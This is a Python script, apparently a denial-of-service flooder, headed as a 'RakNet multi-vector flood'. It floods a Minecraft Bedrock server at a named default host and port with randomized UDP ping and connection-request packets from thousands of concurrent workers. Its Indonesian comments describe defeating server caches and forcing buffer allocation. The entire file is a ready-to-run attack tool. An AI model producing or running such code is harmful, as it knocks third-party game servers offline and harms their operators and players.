# bedrock_load.py — RakNet multi-vector flood, gacor edition
# python 3.12 | stdlib only

import asyncio
import os
import random
import signal
import socket
import struct
import time

HOST     = os.environ.get("HOST", "business3.astrixhost.web.id")
PORT     = int(os.environ.get("PORT", "5073"))
DURATION = int(os.environ.get("DURATION", "1800"))
CONC     = int(os.environ.get("CONC", "5000"))
SOCKET_PER_WORKER = int(os.environ.get("SOCKETS", "2"))
SHARD    = os.environ.get("SHARD", "0")

RAKNET_MAGIC = bytes([
    0x00, 0xff, 0xff, 0x00, 0xfe, 0xfe, 0xfe, 0xfe,
    0xfd, 0xfd, 0xfd, 0xfd, 0x12, 0x34, 0x56, 0x78,
])

# Rentang protocol version RakNet Bedrock 1.20.x — variasi biar servernya
# ga bisa pakai fast-path cache
PROTO_VERSIONS = [11, 10, 9, 8]


def pkt_ping():
    """0x01 unconnected ping — server balas 0x1c unconnected pong + info."""
    t = random.getrandbits(64)
    g = random.getrandbits(64)
    return b"\x01" + struct.pack(">Q", t) + RAKNET_MAGIC + struct.pack(">Q", g)


def pkt_oc1():
    """0x05 open connection request 1 — server alokasi state, balas 0x06."""
    proto = random.choice(PROTO_VERSIONS)
    mtu_pad = random.choice([0, 100, 500, 1200, 1400])
    return (b"\x05" + RAKNET_MAGIC + bytes([proto])
            + struct.pack(">H", mtu_pad))


def pkt_oc2():
    """0x07 open connection request 2 — server proses encryption handshake."""
    cookie = random.getrandbits(32)
    return (b"\x07" + RAKNET_MAGIC + struct.pack(">I", cookie)
            + bytes([random.randint(0, 1)]))


def pkt_incompat():
    """0x19 incompatible protocol — server kadang balas + log."""
    proto = random.choice(PROTO_VERSIONS)
    return (b"\x19" + bytes([proto]) + RAKNET_MAGIC
            + struct.pack(">Q", random.getrandbits(64)))


def pkt_oc1_oversized():
    """0x05 dengan padding gede — paksa server alokasi buffer lebih."""
    proto = random.choice(PROTO_VERSIONS)
    pad = os.urandom(random.randint(1200, 1400))
    return b"\x05" + RAKNET_MAGIC + bytes([proto]) + pad


PACKET_BUILDERS = [
    (pkt_ping, 0.35),
    (pkt_oc1, 0.30),
    (pkt_oc2, 0.20),
    (pkt_incompat, 0.10),
    (pkt_oc1_oversized, 0.05),
]


def pick_pkt():
    r = random.random()
    cum = 0.0
    for builder, weight in PACKET_BUILDERS:
        cum += weight
        if r <= cum:
            return builder()
    return pkt_ping()


# ---- stats ----
class Stats:
    def __init__(self):
        self.sent = 0
        self.rx = 0
        self.rx_bytes = 0
        self.fail = 0
        self.start = time.time()
        self.lock = asyncio.Lock()

    async def inc(self, sent=0, rx=0, b=0, fail=0):
        async with self.lock:
            self.sent += sent
            self.rx += rx
            self.rx_bytes += b
            self.fail += fail

    def snap(self) -> str:
        dt = max(1e-6, time.time() - self.start)
        ratio = (self.rx / self.sent * 100) if self.sent else 0.0
        return (f"[shard {SHARD}] sent={self.sent} rx={self.rx} "
                f"({ratio:.1f}%) rxb={self.rx_bytes} fail={self.fail} "
                f"rate={self.sent / dt:.0f} pkt/s")


STATS = Stats()
STOP = asyncio.Event()


class BedrockWorker:
    def __init__(self):
        self.socks = []
        for _ in range(SOCKET_PER_WORKER):
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 << 20)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 4 << 20)
            s.setblocking(False)
            self.socks.append(s)
        self.rr = 0

    async def run(self):
        while not STOP.is_set():
            sock = self.socks[self.rr]
            self.rr = (self.rr + 1) % len(self.socks)
            try:
                # burst: kirim 4 paket berturut-turut sebelum yield
                for _ in range(4):
                    pkt = pick_pkt()
                    try:
                        sock.sendto(pkt, (HOST, PORT))
                        await STATS.inc(sent=1)
                    except OSError:
                        await STATS.inc(fail=1)
                # baca balasan (non-blocking) — sampe buffer abis
                for _ in range(8):
                    try:
                        data, _ = sock.recvfrom(4096)
                        await STATS.inc(rx=1, b=len(data))
                    except BlockingIOError:
                        break
                    except OSError:
                        break
                # yield ringan — jangan burn CPU lokal
                await asyncio.sleep(0)
            except Exception:
                await STATS.inc(fail=1)


async def reporter():
    while not STOP.is_set():
        await asyncio.sleep(3)
        print(STATS.snap(), flush=True)


async def main():
    print(f"[shard {SHARD}] UDP target={HOST}:{PORT} conc={CONC} "
          f"sockets/worker={SOCKET_PER_WORKER} dur={DURATION}s",
          flush=True)

    workers = [BedrockWorker() for _ in range(CONC)]
    tasks = [asyncio.create_task(w.run()) for w in workers]
    rep = asyncio.create_task(reporter())

    try:
        await asyncio.sleep(DURATION)
    finally:
        STOP.set()
        rep.cancel()
        for t in tasks:
            t.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)

    print(STATS.snap(), flush=True)


def _sig(s, f):
    STOP.set()


if __name__ == "__main__":
    signal.signal(signal.SIGINT, _sig)
    signal.signal(signal.SIGTERM, _sig)
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
